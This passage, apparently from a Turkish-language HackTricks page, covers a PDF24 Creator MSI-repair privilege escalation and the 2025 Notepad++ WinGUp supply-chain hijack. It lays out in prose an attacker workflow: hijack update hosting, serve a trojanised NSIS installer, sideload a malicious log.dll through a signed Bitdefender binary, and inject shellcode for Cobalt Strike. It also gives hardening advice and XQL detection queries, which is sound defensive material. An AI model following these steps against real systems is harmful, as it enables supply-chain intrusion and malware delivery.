PDF24 Creator 11.15.1, ayrı bir MSI onarım riskini gösterir: yazıcı yükleme custom action'ı, onarım sırasında SYSTEM haklarıyla görünür bir konsol açabilir. Üretici, bu davranışı gidermek için MSI installer'ını 11.15.2'de değiştirdi. Ürünün eski bir sürümü yalnızca bir triage ipucudur. Kayıtlı veya erişilebilir MSI paketini, bu kullanıcının onarımı başlatıp başlatamayacağını, güvenlik açığı olan custom action'ın ve log-file gecikmesinin mevcut olup olmadığını ve etkileşimli bir masaüstünün konsolu gösterip gösteremeyeceğini kontrol edin. Bildirilen gecikmede `faxPrnInst.log` üzerinde bir oplock kullanılmıştır; dosyanın sıradan şekilde yazılabilir olması tek erişim koşulu değildir. Etkileşimli olmayan bir shell, erişilemeyen bir paket veya yamalı bir installer zinciri bozabilir. Bu sorun `AlwaysInstallElevated` özelliğine bağlı değildir ve tahmin edilebilir geçici bir script'i değiştirmekten farklıdır.

---
## Zayıf updater doğrulamasıyla uzaktan supply-chain hijacking (WinGUp / Notepad++)

Haziran 2025 ile Aralık 2025 arasında, Notepad++ güncelleme akışının arkasındaki hosting altyapısını ele geçiren saldırganlar, seçtikleri kurbanlara kasıtlı olarak kötü amaçlı manifest'ler sundu. WinGUp tabanlı eski updater'lar güncelleme özgünlüğünü tam olarak doğrulamıyordu; bu nedenle kötü amaçlı bir XML yanıtı, istemcileri saldırganın kontrolündeki URL'lere yönlendirebiliyordu. İstemci, indirilen installer üzerinde hem güvenilir bir sertifika zincirini hem de geçerli bir PE imzasını zorunlu kılmadan HTTPS içeriğini kabul ettiğinden, kurbanlar trojan'laştırılmış bir NSIS `update.exe` indirip çalıştırdı.<sup>[[12]](#references)[[13]](#references)</sup>

Operasyonel akış (yerel exploit gerekmez):
1. **Altyapı interception'ı**: CDN/hosting'i ele geçirin ve güncelleme kontrollerine, kötü amaçlı bir indirme URL'sine yönlendiren saldırgan metadata'sıyla yanıt verin.
2. **Trojan'laştırılmış NSIS**: installer bir payload indirip çalıştırır ve iki execution chain'den yararlanır:
   - **Kendi imzalı binary'sini getir + sideload**: imzalı Bitdefender `BluetoothService.exe` dosyasını pakete ekleyin ve arama yoluna kötü amaçlı bir `log.dll` bırakın. İmzalı binary çalıştığında Windows, `log.dll` dosyasını sideload eder; bu DLL, statik tespiti zorlaştırmak için Chrysalis backdoor'unu (Warbird korumalı + API hashing) çözüp reflectively yükler.
   - **Script tabanlı shellcode injection**: NSIS, shellcode enjekte etmek ve Cobalt Strike Beacon'ı hazırlamak için Win32 API'lerini (ör. `EnumWindowStationsW`) kullanan derlenmiş bir Lua script'i çalıştırır.<sup>[[12]](#references)</sup>

Herhangi bir auto-updater için hardening/detection çıkarımları:
- İndirilen installer için **sertifika + imza doğrulamasını** zorunlu kılın (üretici imzalayanını pin'leyin, eşleşmeyen CN/chain değerlerini reddedin) ve güncelleme manifest'inin kendisini imzalayın (ör. XMLDSig). Manifest tarafından kontrol edilen yönlendirmeleri doğrulanmadıkça engelleyin.
- **BYO imzalı binary sideloading** olayını indirme sonrası bir tespit pivot'u olarak ele alın: imzalı bir üretici EXE'sinin kanonik kurulum yolu dışındaki bir konumdan DLL yüklemesi (ör. Bitdefender'ın Temp/Downloads konumundan `log.dll` yüklemesi) ve updater'ın Temp konumuna üretici imzası taşımayan installer'lar bırakıp çalıştırması durumlarında uyarı üretin.
- Bu zincirde gözlemlenen **malware'e özgü artifact'leri** izleyin (genel pivot'lar olarak kullanılabilir): `Global\Jdhfv_1.0.1` mutex'i, `%TEMP%` konumuna olağandışı `gup.exe` yazımları ve Lua ile yürütülen shellcode injection aşamaları.
- Notepad++ v8.8.9 ve sonraki sürümlerde WinGUp'ı güçlendirerek karşılık verdi: döndürülen XML artık imzalıdır (XMLDSig) ve yeni sürümler, yalnızca aktarıma güvenmek yerine indirilen installer için sertifika + imza doğrulamasını zorunlu kılar.<sup>[[13]](#references)</sup>

<details>
<summary>Cortex XDR XQL – Bitdefender imzalı EXE ile <code>log.dll</code> sideloading (T1574.001)</summary>

```sql
// Identifies Bitdefender-signed processes loading log.dll outside vendor paths
config case_sensitive = false
| dataset = xdr_data
| fields actor_process_signature_vendor, actor_process_signature_product, action_module_path, actor_process_image_path, actor_process_image_sha256, agent_os_type, event_type, event_id, agent_hostname, _time, actor_process_image_name
| filter event_type = ENUM.LOAD_IMAGE and agent_os_type = ENUM.AGENT_OS_WINDOWS
| filter actor_process_signature_vendor contains "Bitdefender SRL" and action_module_path contains "log.dll"
| filter actor_process_image_path not contains "Program Files\\Bitdefender"
| filter not actor_process_image_name in ("eps.rmm64.exe", "downloader.exe", "installer.exe", "epconsole.exe", "EPHost.exe", "epintegrationservice.exe", "EPPowerConsole.exe", "epprotectedservice.exe", "DiscoverySrv.exe", "epsecurityservice.exe", "EPSecurityService.exe", "epupdateservice.exe", "testinitsigs.exe", "EPHost.Integrity.exe", "WatchDog.exe", "ProductAgentService.exe", "EPLowPrivilegeWorker.exe", "Product.Configuration.Tool.exe", "eps.rmm.exe")
```

</details>

<details>
<summary>Cortex XDR XQL – <code>gup.exe</code>'nin Notepad++ dışındaki bir yükleyiciyi başlatması</summary>

```sql
config case_sensitive = false
| dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START and _product = "XDR agent" and _vendor = "PANW"
| filter lowercase(actor_process_image_name) = "gup.exe" and actor_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN ) and action_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN )
| filter lowercase(action_process_image_name) ~= "(npp[\.\d]+?installer)"
| filter action_process_signature_status != ENUM.SIGNED or lowercase(action_process_signature_vendor) != "notepad++"
```

</details>

Bu kalıplar, imzasız manifestoları kabul eden veya yükleyici imzalayanlarını sabitlemeyen tüm güncelleyicilere uygulanabilir: ağın ele geçirilmesi + kötü amaçlı yükleyici + BYO imzalı sideloading, “güvenilir” güncellemeler kisvesi altında uzaktan kod yürütmeyle sonuçlanır.

---
## References
- [1] [Güvenlik Önerisi – Windows için Netskope Client – Sahte Sunucu Üzerinden Yerel Yetki Yükseltme (CVE-2025-0309)](https://blog.amberwolf.com/blog/2025/august/advisory---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [2] [Netskope Güvenlik Önerisi NSKPSA-2025-002](https://www.netskope.com/resources/netskope-resources/netskope-security-advisory-nskpsa-2025-002)
- [3] [NachoVPN – Netskope eklentisi](https://github.com/AmberWolfCyber/NachoVPN)
- [4] [UpSkope – Netskope IPC istemcisi/exploit'i](https://github.com/AmberWolfCyber/UpSkope)
- [5] [NVD – CVE-2025-0309](https://nvd.nist.gov/vuln/detail/CVE-2025-0309)
- [6] [SensePost – ASUS DriverHub, MSI Center, Acer Control Centre ve Razer Synapse 4'ü Pwning](https://sensepost.com/blog/2025/pwning-asus-driverhub-msi-center-acer-control-centre-and-razer-synapse-4/)
- [7] [0xdf – HTB: NanoCorp](https://0xdf.gitlab.io/2026/06/20/htb-nanocorp.html)
- [8] [SEC Consult – Checkmk Agent'taki yazılabilir dosyalar üzerinden Yerel Yetki Yükseltme](https://sec-consult.com/vulnerability-lab/advisory/local-privilege-escalation-via-writable-files-in-checkmk-agent/)
- [9] [Checkmk Werk #16361 – Windows agent'ta yetki yükseltme](https://checkmk.com/werk/16361)
- [10] [sensepost/bloatware-pwn PoC'leri](https://github.com/sensepost/bloatware-pwn)
- [11] [CyberArk PipeViewer](https://github.com/cyberark/PipeViewer)
- [12] [Unit 42 – Ulus-Devlet Aktörleri Notepad++ Tedarik Zincirini İstismar Ediyor](https://unit42.paloaltonetworks.com/notepad-infrastructure-compromise/)
- [13] [Notepad++ – ele geçirilen altyapı olayı güncellemesi](https://notepad-plus-plus.org/news/hijacked-incident-info-update/)
- [14] [AmberWolf – Windows için Netskope Client'taki CVE-2025-0309 düzeltmesini atlatma](https://blog.amberwolf.com/blog/2026/march/patch-bypass---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [15] [Atredis – Lenovo Vantage'daki Yetki Yükseltme Hatalarını Ortaya Çıkarma](https://www.atredis.com/blog/2025/7/7/uncovering-privilege-escalation-bugs-in-lenovo-vantage)
{{#include ../../banners/hacktricks-training.md}}
